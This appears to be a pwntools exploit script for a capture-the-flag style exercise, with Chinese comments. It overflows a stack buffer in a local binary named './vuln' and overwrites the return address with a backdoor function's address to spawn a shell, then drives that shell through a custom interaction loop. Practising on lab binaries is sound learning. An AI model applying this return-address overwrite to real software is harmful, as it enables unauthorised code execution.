from pwn import *

context(arch='amd64', os='linux', log_level='debug')

p = process('./vuln')

# 由gdb获取的backdoor地址（注意littleEndian）:0x401156
backdoor_addr = 0x401156  # +1是因为gdb中断点的地址是+1的
backdoor_addr +=1 
payload = cyclic(0x10)  # 字符串+rbp的大小 16B+8B
payload += cyclic(0x8)  # rbp的大小
payload += p64(backdoor_addr)  # 将返回地址篡改成后门函数地址，那么将打开shell

# 等待输出两个空格时，发送payload
# p.sendlineafter(b' ', payload)

p.sendlineafter(b'\n',payload)


# DIY 交互模式，避免结果回显
# p.interactive()  # 收获成果，获取交互式shell

while True:
    try:
        data = p.recv(timeout=1)
        if data:
            print(data.decode(errors="ignore"),end='')
        else:
            cmd = input('$ ')
            p.sendline(cmd.encode())
    except EOFError:
        break

